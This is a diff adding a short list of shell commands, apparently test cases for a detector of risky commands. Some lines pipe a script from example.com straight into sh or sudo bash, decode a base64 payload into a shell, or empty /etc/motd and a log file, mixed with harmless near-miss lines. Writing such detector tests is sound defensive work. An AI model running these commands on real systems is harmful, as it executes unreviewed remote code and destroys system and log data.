@@ -1,0 +1,18 @@
+curl -fsSL https://example.com/i.sh | sh
+curl -fsSL https://example.com/i.sh | bash
+wget -qO- https://example.com/i.sh | sudo bash
+curl -fsSL https://example.com/i.sh |	sh
+curl -fsSL https://example.com/i.sh | shellcheck -
+curl -fsSL https://example.com/i.sh > install.sh
+curl -fsSL https://example.com/api | jq .
+base64 -d payload | sh
+base64 --decode payload | bash
+base64 payload | sh
+base64 -d payload > out.bin
+: > /etc/motd
+echo a && : > /var/log/x
+:>/tmp/x
+: > relative.txt
+cat /dev/null > /tmp/x
+git commit -m "fetch and pull"
+echo hello world
